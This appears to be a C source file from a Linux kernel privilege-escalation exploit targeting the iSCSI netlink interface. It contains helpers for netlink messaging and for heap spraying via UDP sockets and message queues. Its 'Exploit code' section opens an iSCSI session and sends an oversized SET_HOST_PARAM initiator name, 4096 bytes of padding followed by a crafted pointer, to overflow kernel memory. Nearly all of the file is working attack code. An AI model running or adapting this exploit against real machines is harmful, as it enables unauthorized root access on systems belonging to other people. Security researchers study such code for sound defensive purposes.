#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <sched.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/un.h>
#include <syscall.h>
#include <unistd.h>

#include "iscsi_if.h"
#include "common.h"

unsigned char buf_padding[SPRAY0_BUF_LEN0];

///////////////////////////////////////////////////////////////////////////////
// File Functions /////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

int read_file(const char * filename, char * buffer, size_t length) {
	int fd, result;

	fd = open(filename, O_RDONLY);
	if(fd < 0) {
		printf("Failed to open file %s: (errno %d: %s)\n", filename, errno, strerror(errno));
		return -1;
	}

	memset(buffer, 0, length);
	result = read(fd, buffer, length);
	close(fd);
	return result;
}

uint64_t get_uint64_from_file(const char * filename, int is_hex) {
	uint64_t ret = 0;
	char buffer[1024];

	if(read_file(filename, buffer, sizeof(buffer)) < 0)
		return 0;
	if(is_hex)
		sscanf(buffer, "%lx", &ret);
	else
		sscanf(buffer, "%lu", &ret);
	return ret;
}

uint64_t get_tcp_transport_handle() {
	return get_uint64_from_file("/sys/class/iscsi_transport/tcp/handle", 0);
}

uint64_t get_iser_transport_handle() {
	return get_uint64_from_file("/sys/class/iscsi_transport/iser/handle", 0);
}

int iser_transport_handle_exists() {
	if ( access("/sys/class/iscsi_transport/iser/handle", R_OK ) == 0 ) {
		return 1;
	}
	else {
		return 0;
	}
}

int iscsi_get_file(int hostno) {
	char filename[256];
	snprintf(filename, sizeof(filename), "/sys/class/iscsi_host/host%d/initiatorname", hostno);
	// leads to seq_read() call
	return open(filename, O_RDONLY);
}

///////////////////////////////////////////////////////////////////////////////
// Netlink Functions //////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

void read_response_error(int sock_fd, struct nlmsghdr * nlh, int exit_on_error)
{
	struct iscsi_uevent * ev;
	struct iovec iov;
	struct msghdr msg;

	//Setup the iov and msghdr
	memset(nlh, 0, NLMSG_LENGTH(MSG_SIZE));
	iov.iov_base = (void *)nlh;
	iov.iov_len = NLMSG_LENGTH(MSG_SIZE);
	memset(&msg, 0, sizeof(struct msghdr));
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	if(recvmsg(sock_fd, &msg, 0) < 0) {
		printf("Couldn't get a reply message (errno %d: %s)\n", errno, strerror(errno));
		exit(1);
	}

	if(exit_on_error) {
		ev = NLMSG_DATA(nlh);
		if(ev->type == ISCSI_KEVENT_IF_ERROR) {
			printf("Got error: if_error %d (%s)\n", ev->iferror, strerror(-ev->iferror));
			exit(1);
		}
	}
}

void read_response(int sock_fd, struct nlmsghdr * nlh)
{
	read_response_error(sock_fd, nlh, 0);
}

void send_netlink_msg_sized(int sock_fd, struct nlmsghdr * nlh, int size)
{
	struct sockaddr_nl addr;
	struct iovec iov;
	struct msghdr msg;

	//Setup the port to send it to
	memset(&addr, 0, sizeof(addr));
	addr.nl_family = AF_NETLINK;
	addr.nl_pid = 0; /* For Linux Kernel */
	addr.nl_groups = 0; /* unicast */

	//Set the flags that are always the same
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = NLM_F_REQUEST;

	//Setup the iov and msghdr
	iov.iov_base = (void *)nlh;
	iov.iov_len = size;
	memset(&msg, 0, sizeof(msg));
	msg.msg_name = (void *)&addr;
	msg.msg_namelen = sizeof(addr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	if(sendmsg(sock_fd, &msg, 0) < 0) {
		printf("Failed to send message (errno %d: %s)\n", errno, strerror(errno));
		exit(1);
	}
}

void send_netlink_msg(int sock_fd, struct nlmsghdr * nlh)
{
	send_netlink_msg_sized(sock_fd, nlh, NLMSG_LENGTH(MSG_SIZE));
}

///////////////////////////////////////////////////////////////////////////////
// UDP Functions //////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

int init_server(struct sockaddr_in *si, int port)
{
	int sock;
	int err;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1) {
		perror("socket");
		return -1;
	}

	memset(si, 0, sizeof(*si));
	si->sin_family = AF_INET;
	si->sin_port = htons(port);
	si->sin_addr.s_addr = htonl(INADDR_ANY);

	err = bind(sock, (struct sockaddr *)si, sizeof(*si));
	if (err == -1) {
		perror("bind");
		close(sock);
		return -1;
	}

	int sendbuff = 10*409600;
	setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuff, sizeof(sendbuff));
	sendbuff = 10*409600;
	setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &sendbuff, sizeof(sendbuff));

	return sock;
}

int init_client(struct sockaddr_in *si, int port)
{
	int sock;
	int err;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1) {
		perror("socket");
		return -1;
	}

	memset(si, 0, sizeof(*si));
	si->sin_family = AF_INET;
	si->sin_port = htons(port);

	err = inet_aton("127.0.0.1", &si->sin_addr);
	if (err == -1) {
		perror("inet_aton");
		close(sock);
		return -1;
	}

	int sendbuff = 10*409600;
	setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuff, sizeof(sendbuff));
	sendbuff = 10*409600;
	setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &sendbuff, sizeof(sendbuff));

	return sock;
}

int client_sendmsg(int sock, struct sockaddr_in *si, char *buf, size_t len)
{
	struct iovec iov;
	struct msghdr mh;

	memset(&iov, 0, sizeof(iov));
	memset(&mh, 0, sizeof(mh));

	iov.iov_base = buf;
	iov.iov_len = len;

	mh.msg_name = si;
	mh.msg_namelen = sizeof(struct sockaddr);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;
	mh.msg_control = NULL;
	mh.msg_controllen = 0;

	return sendmsg(sock, &mh, 0);
}

int init_msgq()
{
	return msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
}

struct msg {
	long mtype;               /* message type, must be > 0 */
	char mtext[2 * MSG_SIZE]; /* message data */
};

int msgq_send(int msgq_fd, char *buf, size_t len) {
	static struct msg m;

	if(len + sizeof(long) > sizeof(struct msg)) {
		printf("msgq_send buffer is not large enough for spray data (needs %lu, has %lu)\n", len, sizeof(struct msg));
		exit(1);
	}

	m.mtype = 1;
	memcpy(&m.mtext, buf, len);

	return msgsnd(msgq_fd, &m, len, 0);
}

int msgq_recv(int msgq_fd) {
	struct msg m;
	return msgrcv(msgq_fd, &m, sizeof(m.mtext), 0, MSG_NOERROR);
}

///////////////////////////////////////////////////////////////////////////////
// Miscellaneous Functions/////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

int bind_cpu() {
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);

	if(sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
		printf("Failed to set CPU affinity: errno %d (%s)\n", errno, strerror(errno));
		exit(1);
	}
}

///////////////////////////////////////////////////////////////////////////////
// Exploit code ///////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

int setup_iscsi(int load_only, uint32_t *hostnop, uint32_t *sidp, int *sock_fdp, uint64_t *handlep)
{
	struct sockaddr_nl addr;
	struct nlmsghdr *nlh = NULL;
	struct iscsi_uevent * ev;
	char * buffer, * payload;

	uint32_t hostno, sid;
	int i, sock_fd;
	uint64_t handle = 0;

	//Try to load the scsi_transport_iscsi and ib_iser modules
	sock_fd = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_RDMA);
	if(sock_fd >= 0)
		close(sock_fd);

	sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ISCSI);
	if(sock_fd < 0) {
		printf("Failed to get a NETLINK_ISCSI socket (errno %d: %s)\n", errno, strerror(errno));
		return -1;
	}

	if(load_only)
		return 0;

	buffer = (void *)(nlh = (struct nlmsghdr *)malloc(NLMSG_LENGTH(MSG_SIZE)));
	if(!buffer) {
		printf("Failed to get memory for message buffer (errno %d: %s)\n", errno, strerror(errno));
		return -1;
	}

	//Get the handle of a iscsi transport
	for(i = 0; handle == 0 && i < 5; i++) {
		if (iser_transport_handle_exists())
			handle = get_iser_transport_handle();
		if(handle == 0) {
			if (i == 0)
				printf("Waiting for iser_transport file to appear\n");
			sleep(1);
		}
	}
	if(handle == 0) {
		printf("Failed to read an iscsi driver handle\n");
		return -1;
	}
	printf("Got iscsi iser transport handle 0x%lx\n", handle);

	//Bind the socket
	memset(&addr, 0, sizeof(addr));
	addr.nl_family = AF_NETLINK;
	addr.nl_pid = getpid();
	bind(sock_fd, (struct sockaddr*)&addr, sizeof(addr));

	//Setup the netlink message header
	memset(nlh, 0, NLMSG_LENGTH(MSG_SIZE));
	nlh->nlmsg_len = NLMSG_LENGTH(MSG_SIZE);
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_type = ISCSI_UEVENT_CREATE_SESSION;

	//Send the create session message
	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	ev->type = ISCSI_UEVENT_CREATE_SESSION;
	ev->iferror = 0;
	ev->transport_handle = handle;
	send_netlink_msg(sock_fd, nlh);

	//Read the response to get the sid and hostno
	read_response(sock_fd, nlh);
	sid = ev->r.c_session_ret.sid;
	hostno = ev->r.c_session_ret.host_no;
	//printf("Success - sid %u - hostno %u\n", sid, hostno);

	free(buffer);

	//Save to the output parameters and return
	*hostnop = hostno;
	*sidp = sid;
	*sock_fdp = sock_fd;
	*handlep = handle;
	return 0;
}

int setup_overflow(uint32_t hostno, int sock_fd, uint64_t handle)
{
	struct nlmsghdr *nlh = NULL;
	struct iscsi_uevent * ev = NULL;
	char * payload = NULL;

	nlh = (struct nlmsghdr *)malloc(NLMSG_LENGTH(MSG_SIZE));
	if(!nlh) {
		printf("Failed to get memory for message buffer (errno %d: %s)\n", errno, strerror(errno));
		return -1;
	}

	//Setup the setting message
	memset(nlh, 0, NLMSG_LENGTH(4096 + 8 + sizeof(struct iscsi_uevent) + 1));
	nlh->nlmsg_len = NLMSG_LENGTH(4096 + 8 + sizeof(struct iscsi_uevent) + 1);
	nlh->nlmsg_type = ISCSI_UEVENT_SET_HOST_PARAM;

	//Send the initiator setting message
	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	ev->type = ISCSI_UEVENT_SET_HOST_PARAM;
	ev->iferror = 0;
	ev->transport_handle = handle;
	ev->u.set_host_param.host_no = hostno;
	ev->u.set_host_param.param = ISCSI_HOST_PARAM_INITIATOR_NAME;
	//ev->u.set_host_param.len = 4096 + 8; //The len parameter isn't used, it uses the string length
	payload = ((void *)ev) + sizeof(struct iscsi_uevent);
	memset(payload, 0x41, 4096);
	*((uint64_t *)(&payload[4096])) = handle + TRANSPORT_STRUCT_OFFSET;
	payload[4096+8] = 0;

	send_netlink_msg(sock_fd, nlh);

	//Read the response to make sure we succeeded
	read_response(sock_fd, nlh);
	//printf("Set name successfully\n");

	free(nlh);
	return 0;
}

